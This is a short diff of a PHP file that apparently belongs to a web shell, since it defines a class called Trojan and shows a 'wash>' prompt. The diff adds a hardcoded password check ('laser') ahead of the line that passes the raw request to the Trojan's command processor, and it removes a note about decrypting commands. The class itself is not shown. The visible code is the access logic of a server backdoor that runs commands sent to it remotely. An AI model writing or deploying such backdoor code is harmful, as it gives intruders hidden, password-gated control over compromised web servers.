@@ -293,7 +293,20 @@ class Trojan{
 }
 
 /* ---------- Procedural code starts here ---------- */
-# @todo (probably here: decrypt the command)
 session_start();
 $trojan = new Trojan();
-$trojan->process_command($_REQUEST);
+
+# only process the command if a valid password has been specified
+if($_REQUEST['args']['password'] == 'laser'){ 
+    $trojan->process_command($_REQUEST);
+}
+
+# otherwise, just spit back an error message
+else { 
+    die(json_encode(
+        array(
+            'error'          => 'Invalid password.',
+            'prompt_context' => 'wash>',
+        )
+    ));
+}
